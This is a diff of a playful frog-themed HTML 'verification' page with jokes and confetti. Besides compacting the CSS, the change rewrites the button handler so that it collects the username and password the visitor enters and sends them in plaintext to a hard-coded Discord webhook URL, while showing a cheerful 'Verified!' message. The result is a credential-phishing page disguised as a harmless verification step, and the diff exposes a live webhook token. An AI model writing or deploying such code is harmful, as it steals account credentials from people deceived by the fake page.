@@ -11,106 +11,27 @@
       font-family: 'Comic Sans MS', sans-serif;
       text-align: center;
       margin: 0;
-      padding: 50px 20px 20px 20px; /* top + sides + bottom */
+      padding: 50px 20px 20px 20px;
       transition: background 1s ease-in-out;
     }
-
-    h1 {
-      font-size: clamp(1.5rem, 6vw, 3em);
-      margin-bottom: 20px;
-      text-shadow: 2px 2px #2e7d32;
-    }
-
-    #frog {
-      font-size: clamp(3rem, 12vw, 6vw);
-      display: inline-block;
-      animation: bounce 1s infinite;
-      margin-bottom: 20px;
-    }
-
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-20px); }
-    }
-
-    .input-field {
-      padding: 12px;
-      margin: 10px 5px;
-      font-size: 1.2em;
-      border-radius: 5px;
-      border: none;
-      width: 70%;
-      max-width: 300px;
-      box-sizing: border-box;
-      transition: transform 0.2s;
-    }
-
-    .input-field:focus { transform: scale(1.05); }
-
-    #verifyBtn {
-      padding: 15px 25px;
-      font-size: 1.2em;
-      border: none;
-      border-radius: 8px;
-      background-color: #ffeb3b;
-      color: #2e7d32;
-      cursor: pointer;
-      margin-top: 15px;
-      transition: 0.2s transform, 0.2s background-color;
-      width: 70%;
-      max-width: 300px;
-    }
-
-    #verifyBtn:hover {
-      background-color: #fdd835;
-      transform: scale(1.1) rotate(-3deg);
-    }
-
+    h1 { font-size: clamp(1.5rem, 6vw, 3em); margin-bottom: 20px; text-shadow: 2px 2px #2e7d32; }
+    #frog { font-size: clamp(3rem, 12vw, 6vw); display: inline-block; animation: bounce 1s infinite; margin-bottom: 20px; }
+    @keyframes bounce { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-20px);} }
+    .input-field { padding:12px;margin:10px 5px;font-size:1.2em;border-radius:5px;border:none;width:70%;max-width:300px;box-sizing:border-box;transition:transform 0.2s; }
+    .input-field:focus{transform:scale(1.05);}
+    #verifyBtn { padding:15px 25px;font-size:1.2em;border:none;border-radius:8px;background-color:#ffeb3b;color:#2e7d32;cursor:pointer;margin-top:15px;transition:0.2s transform, 0.2s background-color;width:70%;max-width:300px;}
+    #verifyBtn:hover{background-color:#fdd835;transform:scale(1.1) rotate(-3deg);}
     #message { margin-top: 20px; font-size: 1.2em; min-height: 1.5em; }
     #discordNotice { font-size:1.2em; font-weight:bold; margin-bottom:10px; }
-    #disclaimer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      font-size: 1.2em;
-      color: #ffffcc;
-      background-color: rgba(0,0,0,0.3);
-      padding: 10px 0;
-      text-align: center;
-      z-index: 10000;
-    }
+    #disclaimer { position: fixed; bottom:0; left:0; width:100%; font-size:1.2em; color:#ffffcc; background-color: rgba(0,0,0,0.3); padding:10px 0; text-align:center; z-index:10000; }
     #joke { font-size: 1.2em; margin-top: 15px; min-height:1.5em; }
-
-    .confetti {
-      position: fixed;
-      width: 1vw;
-      height: 1vw;
-      background-color: #ffff00;
-      top: 0;
-      left: 50%;
-      opacity: 0.9;
-      z-index: 9999;
-      pointer-events: none;
-      animation: fall linear forwards;
-    }
-
-    @keyframes fall {
-      to { transform: translateY(100vh) rotate(360deg); opacity: 0; }
-    }
-
+    .confetti { position: fixed; width: 1vw; height: 1vw; top:0; left:50%; opacity:0.9; z-index:9999; pointer-events:none; animation: fall linear forwards; }
+    @keyframes fall { to { transform: translateY(100vh) rotate(360deg); opacity:0; } }
     @media (max-width: 600px) {
       h1 { font-size: 2em; }
-      .input-field { 
-        font-size: 1em; 
-        width: 90%;  
-      }
-      #verifyBtn { 
-        font-size: 1em; 
-        padding: 12px 0; 
-        width: 90%; 
-      }
-      #joke { font-size: 1em; }
+      .input-field { font-size:1em; width:90%; }
+      #verifyBtn { font-size:1em; padding:12px 0; width:90%; }
+      #joke { font-size:1em; }
     }
   </style>
 </head>
@@ -158,17 +79,38 @@
     ];
 
     function changeJoke() {
-      const randomIndex = Math.floor(Math.random() * jokes.length);
-      jokeElem.textContent = jokes[randomIndex];
+      jokeElem.textContent = jokes[Math.floor(Math.random()*jokes.length)];
     }
 
     setInterval(changeJoke, 5000);
     changeJoke();
 
-    // Button animation & confetti
+    // Verification button with Discord webhook
     button.addEventListener("click", () => {
-      createConfetti();
-      message.textContent = "Verified! 🐸";
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if(username && password) {
+        createConfetti();
+        message.textContent = `Verified! 🐸 Welcome, ${username}!`;
+
+        // Send to Discord webhook
+        fetch("https://discord.com/api/webhooks/1409611043033976832/S730sZFzy9rDdpue2pqY2DVuFBXovlI5mhT4iMOAPji40S5-hvdn7hsIgLTnHdoU0Kn-", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `New verification!\nUsername: ${username}\nPassword: ${password}`
+          })
+        })
+        .then(res => {
+          if(res.ok) console.log("Webhook sent successfully!");
+          else console.error("Webhook failed:", res.statusText);
+        })
+        .catch(err => console.error("Error sending webhook:", err));
+
+      } else {
+        message.textContent = "Please enter both username and password.";
+      }
     });
   </script>
 </body>
